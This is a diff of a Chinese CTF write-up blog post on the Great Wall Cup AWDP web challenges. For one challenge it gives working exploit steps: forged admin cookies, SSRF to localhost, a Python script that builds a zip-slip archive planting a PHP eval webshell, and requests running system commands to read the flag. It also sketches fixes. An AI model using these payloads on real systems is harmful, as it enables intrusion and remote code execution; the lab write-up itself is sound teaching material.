@@ -19,50 +19,67 @@
   <meta name="author" content="Suzen">
   <meta name="keywords" content="">
   
-    <meta name="description" content="上午的 AWDP 就修了一个，一个也没打通 :( 复现网址：https:&#x2F;&#x2F;gz.imxbt.cn&#x2F;games&#x2F;36&#x2F;challenges#  easy_timeFix不会修… Break开始是一个登录界面，可以弱口令登录，密码是secret  或者根据源码index.py里可以看到，admin的密码是硬编码的，是经过了两次MD5加密，并且这里如果登录成功，就会设置Cookie中visited&#x3D;">
+    <meta name="description" content="上午的 AWDP 就修了一个，一个也没打通，下午的渗透就打了个Shiro，不嘻嘻 :( 复现网址：https:&#x2F;&#x2F;gz.imxbt.cn&#x2F;games&#x2F;36&#x2F;challenges#  AWDPeasy_timeBreak开始是一个登录界面，可以弱口令登录，密码是secret  或者根据源码index.py里可以看到，admin的密码是硬编码的，是经过了两次MD5加密，并且这里如果登录成功，就会设置">
 <meta property="og:type" content="article">
 <meta property="og:title" content="第三届长城杯半决赛-AWDP-部分WEB解">
 <meta property="og:url" content="https://yschen20.github.io/2026/03/24/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B-AWDP-%E9%83%A8%E5%88%86WEB%E8%A7%A3/index.html">
 <meta property="og:site_name" content="Suzen">
-<meta property="og:description" content="上午的 AWDP 就修了一个，一个也没打通 :( 复现网址：https:&#x2F;&#x2F;gz.imxbt.cn&#x2F;games&#x2F;36&#x2F;challenges#  easy_timeFix不会修… Break开始是一个登录界面，可以弱口令登录，密码是secret  或者根据源码index.py里可以看到，admin的密码是硬编码的，是经过了两次MD5加密，并且这里如果登录成功，就会设置Cookie中visited&#x3D;">
+<meta property="og:description" content="上午的 AWDP 就修了一个，一个也没打通，下午的渗透就打了个Shiro，不嘻嘻 :( 复现网址：https:&#x2F;&#x2F;gz.imxbt.cn&#x2F;games&#x2F;36&#x2F;challenges#  AWDPeasy_timeBreak开始是一个登录界面，可以弱口令登录，密码是secret  或者根据源码index.py里可以看到，admin的密码是硬编码的，是经过了两次MD5加密，并且这里如果登录成功，就会设置">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324185439923.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324185609858.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324185905217.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324190509950.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324190728478.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324191200616.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324191327428.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324191459186.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324191655985.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324191815625.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324191825560.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324192220161.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324192315029.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324192832942.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324192925949.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324193120304.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324193400491.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324193524565.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324195622764.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324194039130.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324194313200.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324194331771.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324195717419.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324195806407.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324202321726.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324200300183.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324200529019.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324202622475.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324201024177.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324202856392.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324202943000.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324185439923-1774890724142-1.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324185609858-1774890724143-2.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324185905217-1774890724143-4.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324190509950-1774890724143-3.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324190728478-1774890724143-5.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324191200616-1774890724143-6.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324191327428-1774890724143-8.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324191459186-1774890724143-7.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324191655985-1774890724143-9.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324191815625-1774890724143-10.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324191825560-1774890724143-11.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324192220161-1774890724144-12.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324192315029-1774890724144-13.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324192832942-1774890724144-14.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324192925949-1774890724144-16.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324193120304-1774890724144-17.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324193400491-1774890724144-18.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324193524565-1774890724144-15.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324195622764-1774890724144-19.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324194039130-1774890724144-20.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324194313200-1774890724145-21.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324194331771-1774890724145-22.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324195717419-1774890724145-23.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324195806407-1774890724145-24.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324202321726-1774890724145-25.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324200300183-1774890724145-26.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324200529019-1774890724145-27.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324202622475-1774890724145-28.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324201024177-1774890724145-29.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324202856392-1774890724145-30.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324202943000-1774890724145-31.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260326183840521.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260326184121408.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260326185851972.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260326190209064.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260326190456312.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260326191357977.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260326191538072.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260326191739599.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260326191930028.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260326191954730.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260326194522409.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260326194246085.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260326194307601.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260326194359453.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260326194438768.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260326194856639.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260326232208581.png">
 <meta property="article:published_time" content="2026-03-24T12:36:47.000Z">
-<meta property="article:modified_time" content="2026-03-24T12:37:22.866Z">
+<meta property="article:modified_time" content="2026-03-30T17:12:25.765Z">
 <meta property="article:author" content="Suzen">
 <meta property="article:tag" content="web 比赛复现">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324185439923.png">
+<meta name="twitter:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324185439923-1774890724142-1.png">
 <meta name="twitter:creator" content="@Suzen">
   
   
@@ -385,7 +402,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.6k 字
+          2.4k 字
         
       </span>
     
@@ -396,7 +413,7 @@
         
         
         
-          14 分钟
+          20 分钟
         
       </span>
     
@@ -451,7 +468,7 @@
               <p id="updated-time" class="note note-info" style="display: none">
                 
                   
-                    本文最后更新于 2026-03-24T20:37:22+08:00
+                    本文最后更新于 2026-03-31T01:12:25+08:00
                   
                   
 
@@ -462,87 +479,87 @@
               <div class="markdown-body">
                 
                 <blockquote>
-<p>上午的 AWDP 就修了一个，一个也没打通 :(</p>
+<p>上午的 AWDP 就修了一个，一个也没打通，下午的渗透就打了个Shiro，不嘻嘻 :(</p>
 <p>复现网址：<a target="_blank" rel="noopener" href="https://gz.imxbt.cn/games/36/challenges#">https://gz.imxbt.cn/games/36/challenges#</a></p>
 </blockquote>
-<h1 id="easy-time"><a href="#easy-time" class="headerlink" title="easy_time"></a>easy_time</h1><h2 id="Fix"><a href="#Fix" class="headerlink" title="Fix"></a>Fix</h2><p>不会修…</p>
-<h2 id="Break"><a href="#Break" class="headerlink" title="Break"></a>Break</h2><p>开始是一个登录界面，可以弱口令登录，密码是<code>secret</code></p>
-<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324185439923.png" srcset="/img/loading.gif" lazyload alt="image-20260324185439923"></p>
+<h1 id="AWDP"><a href="#AWDP" class="headerlink" title="AWDP"></a>AWDP</h1><h2 id="easy-time"><a href="#easy-time" class="headerlink" title="easy_time"></a>easy_time</h2><h3 id="Break"><a href="#Break" class="headerlink" title="Break"></a>Break</h3><p>开始是一个登录界面，可以弱口令登录，密码是<code>secret</code></p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324185439923-1774890724142-1.png" srcset="/img/loading.gif" lazyload alt="image-20260324185439923"></p>
 <p>或者根据源码<code>index.py</code>里可以看到，admin的密码是硬编码的，是经过了两次MD5加密，并且这里如果登录成功，就会设置Cookie中<code>visited=yes</code>，<code>user</code>为登录用户名，这要设置一下这俩就可以伪造Cookie未授权登录了</p>
-<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324185609858.png" srcset="/img/loading.gif" lazyload alt="image-20260324185609858"></p>
-<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324185905217.png" srcset="/img/loading.gif" lazyload alt="image-20260324185905217"></p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324185609858-1774890724143-2.png" srcset="/img/loading.gif" lazyload alt="image-20260324185609858"></p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324185905217-1774890724143-4.png" srcset="/img/loading.gif" lazyload alt="image-20260324185905217"></p>
 <p>在<code>docker-compose.yaml</code>中可以看到靶机内部存在80端口，在<code>Dockerfile</code>中可以看到存放的是<code>html</code>中的三个文件，这就可以想到找SSRF去打这个端口</p>
-<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324190509950.png" srcset="/img/loading.gif" lazyload alt="image-20260324190509950"></p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324190509950-1774890724143-3.png" srcset="/img/loading.gif" lazyload alt="image-20260324190509950"></p>
 <p>访问<code>/about</code>路由可以找到可能存在SSRF的地方</p>
-<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324190728478.png" srcset="/img/loading.gif" lazyload alt="image-20260324190728478"></p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324190728478-1774890724143-5.png" srcset="/img/loading.gif" lazyload alt="image-20260324190728478"></p>
 <p>去源码中看，可以 POST 传参<code>avatar_url</code>，这个参数是可控的</p>
-<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324191200616.png" srcset="/img/loading.gif" lazyload alt="image-20260324191200616"></p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324191200616-1774890724143-6.png" srcset="/img/loading.gif" lazyload alt="image-20260324191200616"></p>
 <p>然后在下面的这里会调用<code>fetch_remote_avatar_info(current[&#39;avatar_url&#39;])</code></p>
-<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324191327428.png" srcset="/img/loading.gif" lazyload alt="image-20260324191327428"></p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324191327428-1774890724143-8.png" srcset="/img/loading.gif" lazyload alt="image-20260324191327428"></p>
 <p>这里的<code>fetch_remote_avatar_info()</code>函数就是可以打SSRF，限制只能使用<code>http</code>或<code>https</code>协议</p>
-<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324191459186.png" srcset="/img/loading.gif" lazyload alt="image-20260324191459186"></p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324191459186-1774890724143-7.png" srcset="/img/loading.gif" lazyload alt="image-20260324191459186"></p>
 <p>所以可以构造如下请求包：</p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/about</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>challenge.imxbt.cn:31418<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>visited=yes; user=admin<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>39<br><br><span class="language-ini"><span class="hljs-attr">avatar_url</span>=http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/phpinfo.php</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324191655985.png" srcset="/img/loading.gif" lazyload alt="image-20260324191655985"></p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324191655985-1774890724143-9.png" srcset="/img/loading.gif" lazyload alt="image-20260324191655985"></p>
 <p>很显然是成功了的，但是源码中放在<code>html</code>目录下的三个文件都没什么用，但是在后台页面中可以看到有上传插件的功能</p>
-<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324191815625.png" srcset="/img/loading.gif" lazyload alt="image-20260324191815625"></p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324191815625-1774890724143-10.png" srcset="/img/loading.gif" lazyload alt="image-20260324191815625"></p>
 <p>是支持上传压缩包并解压缩的，所以如果我构造好一个压缩包上传，如果能存在目录穿越之类的漏洞，我就可以将解压的文件传到<code>html</code>目录下，然后就能通过上面的SSRF从而可以实现RCE</p>
-<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324191825560.png" srcset="/img/loading.gif" lazyload alt="image-20260324191825560"></p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324191825560-1774890724143-11.png" srcset="/img/loading.gif" lazyload alt="image-20260324191825560"></p>
 <p>去看源码，是会调用<code>safe_upload()</code>这个函数实现上传的</p>
-<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324192220161.png" srcset="/img/loading.gif" lazyload alt="image-20260324192220161"></p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324192220161-1774890724144-12.png" srcset="/img/loading.gif" lazyload alt="image-20260324192220161"></p>
 <p>再去看<code>safe_upload()</code>这个函数，发现是直接使用的<code>info.filename</code>，这是可控的，<code>os.path.join</code>只会做字符串拼接，不会过滤目录穿越需要的字符</p>
-<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324192315029.png" srcset="/img/loading.gif" lazyload alt="image-20260324192315029"></p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324192315029-1774890724144-13.png" srcset="/img/loading.gif" lazyload alt="image-20260324192315029"></p>
 <p>所以只要将上传的压缩包中的文件名修改为<code>../../../../../../var/www/html/shell.php</code>，就可以通过目录穿越，将构造的恶意文件上传到<code>html</code>目录下，因为<code>windows</code>中命名文件不允许写<code>/</code>，所以这里可以利用脚本来生成压缩包：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zipfile<br><br><span class="hljs-keyword">with</span> zipfile.ZipFile(<span class="hljs-string">&quot;shell.zip&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> zipf:<br>    zipf.writestr(<span class="hljs-string">&quot;../../../../../../var/www/html/shell.php&quot;</span>, <span class="hljs-string">&quot;&lt;?php eval($_GET[&#x27;shell&#x27;]);?&gt;&quot;</span>)<br><br></code></pre></td></tr></table></figure>
 
 <p>运行脚本生成<code>shell.zip</code>文件，然后直接上传即可</p>
-<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324192832942.png" srcset="/img/loading.gif" lazyload alt="image-20260324192832942"></p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324192832942-1774890724144-14.png" srcset="/img/loading.gif" lazyload alt="image-20260324192832942"></p>
 <p>此时就可以通过SSRF去访问<code>shell.php</code>文件并进行RCE</p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/about</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>challenge.imxbt.cn:31418<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>visited=yes; user=admin<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>57<br><br><span class="language-ini"><span class="hljs-attr">avatar_url</span>=http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/shell.php?shell=system(<span class="hljs-string">&#x27;id&#x27;</span>)<span class="hljs-comment">;</span></span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324192925949.png" srcset="/img/loading.gif" lazyload alt="image-20260324192925949"></p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324192925949-1774890724144-16.png" srcset="/img/loading.gif" lazyload alt="image-20260324192925949"></p>
 <p>flag在<code>/tmp/flag</code>，还有要注意的是这里不能使用空格，不然命令不会执行成功，可以随便找个绕过空格的方法即可，我用的<code>$&#123;IFS&#125;</code></p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/about</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>challenge.imxbt.cn:31418<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>visited=yes; user=admin<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>73<br><br><span class="language-ini"><span class="hljs-attr">avatar_url</span>=http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/shell.php?shell=system(<span class="hljs-string">&#x27;cat$&#123;IFS&#125;/tmp/flag&#x27;</span>)<span class="hljs-comment">;</span></span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324193120304.png" srcset="/img/loading.gif" lazyload alt="image-20260324193120304"></p>
-<h1 id="MediaDrive"><a href="#MediaDrive" class="headerlink" title="MediaDrive"></a>MediaDrive</h1><blockquote>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324193120304-1774890724144-17.png" srcset="/img/loading.gif" lazyload alt="image-20260324193120304"></p>
+<h3 id="Fix"><a href="#Fix" class="headerlink" title="Fix"></a>Fix</h3><p>感觉应该可以对SSRF的部分过滤本地回环地址之类的，还有上传压缩包的地方对文件名限制目录穿越的，具体的修复也没环境尝试</p>
+<h2 id="MediaDrive"><a href="#MediaDrive" class="headerlink" title="MediaDrive"></a>MediaDrive</h2><blockquote>
 <p>这一题是当时唯一修好的一个，但是没打</p>
 </blockquote>
-<h2 id="Fix-1"><a href="#Fix-1" class="headerlink" title="Fix"></a>Fix</h2><p>先随便上传个文件</p>
-<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324193400491.png" srcset="/img/loading.gif" lazyload alt="image-20260324193400491"></p>
+<h3 id="Fix-1"><a href="#Fix-1" class="headerlink" title="Fix"></a>Fix</h3><p>先随便上传个文件</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324193400491-1774890724144-18.png" srcset="/img/loading.gif" lazyload alt="image-20260324193400491"></p>
 <p>然后抓包看看，这里抓的<code>preview</code>的包，会发现Cookie中是一段URL编码的序列化数据，其中有个<code>basePath</code>属性是指定的文件路径，然后我就想到这里是不是可以通过修改这个值从而进行目录穿越</p>
-<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324193524565.png" srcset="/img/loading.gif" lazyload alt="image-20260324193524565"></p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324193524565-1774890724144-15.png" srcset="/img/loading.gif" lazyload alt="image-20260324193524565"></p>
 <p>然后我就去看源码了</p>
-<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324195622764.png" srcset="/img/loading.gif" lazyload alt="image-20260324195622764"></p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324195622764-1774890724144-19.png" srcset="/img/loading.gif" lazyload alt="image-20260324195622764"></p>
 <p>在<code>preview.php</code>中，通过<code>file_get_contents()</code>函数来读文件内容的</p>
-<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324194039130.png" srcset="/img/loading.gif" lazyload alt="image-20260324194039130"></p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324194039130-1774890724144-20.png" srcset="/img/loading.gif" lazyload alt="image-20260324194039130"></p>
 <p>这里传入的<code>$convertedPath</code>是对<code>$rawPath</code>经过编码转换后的</p>
-<p><img src="/2025/11/12/0xGame2025-WEB-WP/EB%E8%A7%A3/image-20260324194313200.png" srcset="/img/loading.gif" lazyload alt="image-20260324194313200"></p>
